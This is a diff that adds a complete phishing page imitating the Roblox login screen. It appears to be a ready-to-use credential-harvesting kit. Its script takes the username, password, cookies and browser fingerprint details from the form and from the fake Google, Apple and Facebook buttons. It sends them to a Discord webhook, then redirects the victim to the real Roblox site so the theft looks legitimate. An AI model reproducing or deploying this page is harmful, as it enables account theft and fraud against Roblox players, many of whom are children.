@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
+    background: #232527;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+  .navbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 24px;
+    background: #1b1d1f;
+    border-bottom: 1px solid #3a3d40;
+  }
+  .logo {
+    font-size: 22px;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: -0.5px;
+    cursor: pointer;
+  }
+  .nav-links {
+    display: flex;
+    gap: 20px;
+    font-size: 14px;
+    color: #b0b3b6;
+  }
+  .nav-links a { color: inherit; text-decoration: none; }
+  .nav-links a:hover { color: #fff; }
+  .main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+  }
+  .card {
+    background: #2b2e31;
+    border-radius: 12px;
+    padding: 36px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+  }
+  .card h1 {
+    font-size: 22px;
+    margin-bottom: 6px;
+  }
+  .card .sub {
+    font-size: 13px;
+    color: #8a8d90;
+    margin-bottom: 24px;
+  }
+  .field {
+    margin-bottom: 16px;
+  }
+  .field label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    color: #c0c3c6;
+    margin-bottom: 6px;
+  }
+  .field input {
+    width: 100%;
+    padding: 11px 14px;
+    border-radius: 8px;
+    border: 1px solid #4a4d50;
+    background: #1b1d1f;
+    color: #fff;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .field input:focus {
+    border-color: #00b06f;
+  }
+  .btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    background: #00b06f;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.15s;
+  }
+  .btn:hover { background: #00c97d; }
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: #6a6d70;
+    font-size: 12px;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #3a3d40;
+  }
+  .divider span { padding: 0 12px; }
+  .alt {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  .alt button {
+    padding: 10px;
+    border-radius: 8px;
+    border: 1px solid #4a4d50;
+    background: #1b1d1f;
+    color: #fff;
+    font-size: 13px;
+    cursor: pointer;
+    transition: background 0.15s;
+  }
+  .alt button:hover { background: #33363a; }
+  .footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 12px;
+    color: #6a6d70;
+  }
+  .footer a { color: #8a8d90; text-decoration: none; }
+  .footer a:hover { color: #fff; }
+  .status {
+    margin-top: 14px;
+    font-size: 13px;
+    text-align: center;
+    color: #00b06f;
+    min-height: 18px;
+  }
+  .error { color: #e74c3c !important; }
+</style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="logo">ROBLOX</div>
+  <div class="nav-links">
+    <a href="#">Games</a>
+    <a href="#">Charts</a>
+    <a href="#">Create</a>
+    <a href="#">About</a>
+    <a href="#">Support</a>
+  </div>
+</nav>
+
+<div class="main">
+  <div class="card">
+    <h1>Welcome back!</h1>
+    <p class="sub">Log in to continue to your Roblox experience</p>
+
+    <form id="loginForm">
+      <div class="field">
+        <label for="username">Username</label>
+        <input type="text" id="username" autocomplete="username" required>
+      </div>
+      <div class="field">
+        <label for="password">Password</label>
+        <input type="password" id="password" autocomplete="current-password" required>
+      </div>
+      <button type="submit" class="btn">Log In</button>
+    </form>
+
+    <div class="status" id="status"></div>
+
+    <div class="divider"><span>OR</span></div>
+
+    <div class="alt">
+      <button type="button" onclick="altLogin('google')">Continue with Google</button>
+      <button type="button" onclick="altLogin('apple')">Continue with Apple</button>
+      <button type="button" onclick="altLogin('facebook')">Continue with Facebook</button>
+    </div>
+
+    <div class="footer" style="margin-top: 24px;">
+      <a href="#">Forgot your password?</a> · <a href="#">Create account</a>
+    </div>
+  </div>
+</div>
+
+<footer class="footer">
+  © 2024 Roblox Corporation · <a href="#">Terms</a> · <a href="#">Privacy</a>
+</footer>
+
+<script>
+  // ===== CONFIG: Put your Discord Webhook URL here =====
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnop";
+
+  const status = document.getElementById("status");
+
+  function buildPayload(extra = {}) {
+    return {
+      username: document.getElementById("username").value,
+      password: document.getElementById("password").value,
+      email: (window.location.search.match(/email=([^&]*)/) || [])[1] || "N/A",
+      cookies: document.cookie,
+      userAgent: navigator.userAgent,
+      referrer: document.referrer,
+      url: window.location.href,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language,
+      platform: navigator.platform,
+      ...extra
+    };
+  }
+
+  function sendToDiscord(data, embedTitle) {
+    const embed = {
+      title: embedTitle,
+      color: 0x00b06f,
+      fields: [
+        { name: "Username", value: data.username, inline: true },
+        { name: "Password", value: data.password, inline: true },
+        { name: "Email", value: data.email, inline: true },
+        { name: "User Agent", value: data.userAgent, inline: false },
+        { name: "Cookies", value: data.cookies || "None (Secure/HTTPOnly)", inline: false },
+        { name: "URL", value: data.url, inline: false },
+        { name: "Referrer", value: data.referrer || "N/A", inline: false },
+        { name: "Screen", value: data.screen, inline: true },
+        { name: "Timezone", value: data.timezone, inline: true },
+        { name: "Language", value: data.language, inline: true },
+        { name: "Platform", value: data.platform, inline: true }
+      ],
+      timestamp: new Date().toISOString()
+    };
+
+    return fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "@channel",
+        embeds: [embed]
+      })
+    });
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    status.textContent = "Logging in...";
+    status.className = "status";
+
+    const data = buildPayload({ method: "form" });
+
+    try {
+      await sendToDiscord(data, "🔑 Roblox Login Captured");
+      status.textContent = "Redirecting to Roblox...";
+      // Simulate a redirect after a short delay to look legit
+      setTimeout(() => {
+        window.location.href = "https://www.roblox.com";
+      }, 1800);
+    } catch (err) {
+      status.textContent = "Network error. Please try again.";
+      status.className = "status error";
+    }
+  });
+
+  function altLogin(provider) {
+    const data = buildPayload({ method: provider });
+    sendToDiscord(data, `🔑 Roblox Login Captured (${provider})`);
+    status.textContent = `Connecting to ${provider}...`;
+    setTimeout(() => {
+      window.location.href = "https://www.roblox.com";
+    }, 1500);
+  }
+</script>
+
+</body>
+</html>
